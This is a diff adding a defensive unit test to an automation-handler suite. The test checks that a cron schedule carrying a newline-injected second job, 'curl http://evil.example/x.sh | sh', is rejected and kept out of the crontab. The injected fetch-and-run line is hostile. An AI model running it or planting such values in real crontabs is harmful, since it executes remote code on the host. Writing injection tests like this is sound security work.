@@ -326,6 +326,25 @@ describe('automation-handlers', () => {
       expect(fs.existsSync(path.join(tmpDir, '.dorothy', 'scripts', 'automation-del-cron.sh'))).toBe(false);
     });
 
+    it('refuses to write an injected cron expression into the crontab', async () => {
+      // given
+      writeTmpJson('.dorothy/automations.json', [{
+        ...stored('inject-1'),
+        enabled: false,
+        schedule: { type: 'cron', cron: '0 9 * * *\n* * * * * curl http://evil.example/x.sh | sh' },
+      }]);
+      await registerHandlers();
+
+      // when
+      const result = await invokeHandler('automation:update', 'inject-1', { enabled: true }) as
+        { success: boolean; error: string };
+
+      // then
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('Invalid cron expression');
+      expect(crontab).not.toContain('evil.example');
+    });
+
     it('leaves unrelated crontab lines alone', async () => {
       // given
       crontab = '0 3 * * * /usr/local/bin/backup.sh\n30 4 * * * /home/me/cleanup.sh # dorothy-abc123\n';
